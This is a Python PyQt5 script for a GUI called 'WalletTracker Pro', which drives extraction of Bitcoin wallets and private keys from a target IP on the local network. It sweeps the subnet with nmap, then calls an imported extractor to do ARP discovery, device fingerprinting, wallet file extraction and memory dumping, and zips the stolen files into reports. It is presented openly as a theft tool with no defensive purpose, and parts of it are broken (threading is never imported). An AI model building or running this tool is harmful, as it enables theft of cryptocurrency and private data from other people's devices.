#!/usr/bin/env python3
import sys, os, subprocess, json, time, pandas as pd, re
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *
from extractor import FullWalletExtractor  # Import extraction engine

class WalletTrackerDashboard(QMainWindow):
    def __init__(self):
        super().__init__()
        self.target_ip = None
        self.interface = self.get_default_interface()
        self.extractor = None
        self.init_ui()
        
    def get_default_interface(self):
        result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
        return re.search(r'dev (\w+)', result.stdout).group(1)
    
    def init_ui(self):
        self.setWindowTitle("WalletTracker Pro v2.0 - Bitcoin Wallet Extractor")
        self.setGeometry(50, 50, 1600, 1000)
        self.setStyleSheet("""
            QMainWindow { background: qlineargradient(x1:0, y1:0, x2:1, y2:1, stop:0 #1a1a2e, stop:1 #16213e); color: #00ff88; }
            QLabel { color: #00ff88; font-size: 14px; }
            QPushButton { background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #00ff88, stop:1 #00cc66); 
                          border: none; padding: 12px; font-size: 14px; font-weight: bold; border-radius: 8px; }
            QPushButton:hover { background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #00cc66, stop:1 #00aa55); }
            QTableWidget { background: #2d2d3d; gridline-color: #444; alternate-background-color: #363645; }
            QHeaderView::section { background: #00ff88; color: black; padding: 8px; font-weight: bold; }
        """)
        
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        
        # Header
        header = QLabel("🔥 WalletTracker Pro v2.0 - Complete Bitcoin Wallet Extraction")
        header.setAlignment(Qt.AlignCenter)
        header.setStyleSheet("font-size: 24px; font-weight: bold; padding: 20px; background: rgba(0,255,136,0.1); border-radius: 10px;")
        main_layout.addWidget(header)
        
        # Control Panel
        control_layout = QHBoxLayout()
        
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("Enter Target IP (e.g., 192.168.1.100)")
        self.ip_input.setStyleSheet("padding: 12px; font-size: 14px; background: #363645;")
        
        self.start_btn = QPushButton("🚀 START EXTRACTION")
        self.stop_btn = QPushButton("⏹ STOP")
        self.scan_btn = QPushButton("🔍 SCAN NETWORK")
        self.export_btn = QPushButton("💾 EXPORT ALL")
        
        for btn in [self.start_btn, self.stop_btn, self.scan_btn, self.export_btn]:
            btn.clicked.connect(self.button_clicked)
        
        control_layout.addWidget(QLabel("Target IP:"))
        control_layout.addWidget(self.ip_input)
        control_layout.addWidget(self.start_btn)
        control_layout.addWidget(self.stop_btn)
        control_layout.addWidget(self.scan_btn)
        control_layout.addWidget(self.export_btn)
        control_layout.addStretch()
        main_layout.addLayout(control_layout)
        
        # Tabs
        self.tabs = QTabWidget()
        self.live_tab = self.create_live_tab()
        self.wallets_tab = self.create_wallets_tab()
        self.device_tab = self.create_device_tab()
        self.files_tab = self.create_files_tab()
        
        self.tabs.addTab(self.live_tab, "🔴 LIVE TRAFFIC")
        self.tabs.addTab(self.wallets_tab, "💰 WALLETS & KEYS")
        self.tabs.addTab(self.device_tab, "📱 DEVICE INFO")
        self.tabs.addTab(self.files_tab, "📁 EXTRACTED FILES")
        
        main_layout.addWidget(self.tabs)
        
        # Status Bar
        self.status_bar = self.statusBar()
        self.status_label = QLabel("Ready - Enter target IP and click START")
        self.status_bar.addWidget(self.status_label)
        
        self.extraction_timer = QTimer()
        self.extraction_timer.timeout.connect(self.update_extraction)
        
    def create_live_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        self.live_table = QTableWidget(0, 6)
        headers = ["Time", "SRC→DST", "Port", "Wallet Type", "Packet Size", "Status"]
        self.live_table.setHorizontalHeaderLabels(headers)
        layout.addWidget(self.live_table)
        return tab
    
    def create_wallets_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        self.wallets_table = QTableWidget(0, 6)
        headers = ["Type", "Value", "Wallet", "Risk", "Timestamp", "File"]
        self.wallets_table.setHorizontalHeaderLabels(headers)
        layout.addWidget(self.wallets_table)
        return tab
    
    def create_device_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        self.device_info = QTextEdit()
        self.device_info.setPlaceholderText("Device information will appear here...")
        layout.addWidget(self.device_info)
        return tab
    
    def create_files_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        self.files_list = QListWidget()
        self.files_list.itemDoubleClicked.connect(self.open_file)
        layout.addWidget(self.files_list)
        return tab
    
    def button_clicked(self):
        sender = self.sender()
        if sender == self.start_btn:
            self.start_extraction()
        elif sender == self.scan_btn:
            self.scan_network()
        elif sender == self.export_btn:
            self.export_all()
    
    def start_extraction(self):
        self.target_ip = self.ip_input.text()
        if not self.target_ip:
            self.status_label.setText("❌ Enter target IP first!")
            return
            
        self.status_label.setText(f"🚀 Extracting from {self.target_ip}...")
        self.extractor = FullWalletExtractor(self.target_ip)
        
        # Run extraction in thread
        thread = threading.Thread(target=self.run_full_extraction)
        thread.daemon = True
        thread.start()
        
        self.extraction_timer.start(2000)
        self.start_btn.setText("⏳ EXTRACTING...")
        self.start_btn.setEnabled(False)
    
    def run_full_extraction(self):
        try:
            self.extractor.arp_discover()
            self.extractor.device_fingerprint()
            self.extractor.extract_wallet_files()
            self.extractor.dump_memory()
            self.extractor.parse_wallet_files()
        except Exception as e:
            self.status_label.setText(f"Error: {str(e)}")
    
    def update_extraction(self):
        if self.extractor:
            # Update all tabs with fresh data
            self.update_live_tab()
            self.update_wallets_tab()
            self.update_device_tab()
            self.update_files_tab()
    
    def scan_network(self):
        result = subprocess.run(['nmap', '-sn', '192.168.1.0/24'], capture_output=True, text=True)
        ips = re.findall(r'192\.168\.1\.\d+', result.stdout)
        self.status_label.setText(f"🔍 Found {len(ips)} devices: {', '.join(ips[:5])}...")
    
    def export_all(self):
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"/opt/wallet-tracker/logs/complete_report_{self.target_ip}_{timestamp}.zip"
        subprocess.run(['zip', '-r', filename, '/opt/wallet-tracker/logs/', '/opt/wallet-tracker/extracted/'])
        self.status_label.setText(f"✅ Full report: {filename}")
    
    def open_file(self, item):
        filename = item.text()
        subprocess.run(['xdg-open', f'/opt/wallet-tracker/{filename}'])
    
    def update_live_tab(self):
        # Live traffic simulation/parsing
        pass
    
    def update_wallets_tab(self):
        if self.extractor and self.extractor.wallets_found:
            self.wallets_table.setRowCount(len(self.extractor.wallets_found))
            for i, wallet in enumerate(self.extractor.wallets_found):
                self.wallets_table.setItem(i, 0, QTableWidgetItem(wallet['type']))
                self.wallets_table.setItem(i, 1, QTableWidgetItem(wallet['value'][:20] + '...'))
    
    def update_device_tab(self):
        if self.extractor and self.extractor.device_info:
            self.device_info.setText(json.dumps(self.extractor.device_info, indent=2))
    
    def update_files_tab(self):
        self.files_list.clear()
        for file in os.listdir('/opt/wallet-tracker/extracted/'):
            if self.target_ip in file:
                self.files_list.addItem(file)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = WalletTrackerDashboard()
    window.show()
    sys.exit(app.exec_())
